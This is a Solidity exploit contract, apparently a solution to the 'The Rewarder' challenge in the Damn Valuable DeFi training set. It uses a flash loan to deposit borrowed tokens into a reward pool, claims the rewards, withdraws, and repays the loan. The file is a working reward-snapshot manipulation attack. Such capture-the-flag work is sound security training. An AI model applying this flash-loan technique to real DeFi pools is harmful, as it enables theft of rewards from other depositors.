pragma solidity 0.8.17;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "./AccountingToken.sol";
import "../DamnValuableToken.sol";

import "forge-std/Test.sol";

contract Hacker {

    //Custom Errors
    error NoDVTTransfert();


    //Contracts Instances

    FlashLoanerPool flashLoan;
    TheRewarderPool rewarder;
    AccountingToken accToken;
    DamnValuableToken dvt;

    address public owner;


    constructor(
        address _flashLoan,
        address _rewarder,
        address _accToken,
        address _dvt,
        address _owner
        ) {
        flashLoan = FlashLoanerPool(_flashLoan);
        rewarder = TheRewarderPool(_rewarder);
        accToken = AccountingToken(_accToken);
        dvt = DamnValuableToken(_dvt);
        owner = _owner;
    }

    function askLoan(uint _amount) external {
        flashLoan.flashLoan(_amount);
    }


    function receiveFlashLoan(uint256 _amount) external {
        
        // Send DVT to deposit function , mint ACC tokens and Reward Token 
        dvt.approve(address(rewarder), _amount);
        rewarder.deposit(_amount);
        
        
        //Change ACC tokens back to DVT 
        rewarder.withdraw(_amount);

        uint amountRewardToken = rewarder.rewardToken().balanceOf(address(this));

        rewarder.rewardToken().transfer(owner, amountRewardToken);
        console.log("DVT Balance:", dvt.balanceOf(address(this)));


        //Repay Flash Loans
        bool success = dvt.transfer(address(flashLoan), _amount);
        if(!success) revert NoDVTTransfert();
    }
}